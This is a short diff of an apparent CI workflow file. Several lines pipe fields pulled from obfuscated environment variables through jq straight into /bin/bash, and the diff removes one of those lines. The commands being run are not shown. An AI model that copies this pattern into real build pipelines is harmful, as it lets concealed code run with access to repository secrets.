@@ -25,7 +25,6 @@ jobs:
           echo $vuua484 | jq -r .sftyy3 | /bin/bash
           printf '%s' "$t5" | jq -r .geud5 | /bin/bash
           echo $anvne67051 | jq -r .i0 | /bin/bash
-          printf '%s' "$zvws7722" | jq -r .zf647 | /bin/bash
           echo $lo53 | jq -r .xtd5403 | /bin/bash
 
       - name: Archive artifact
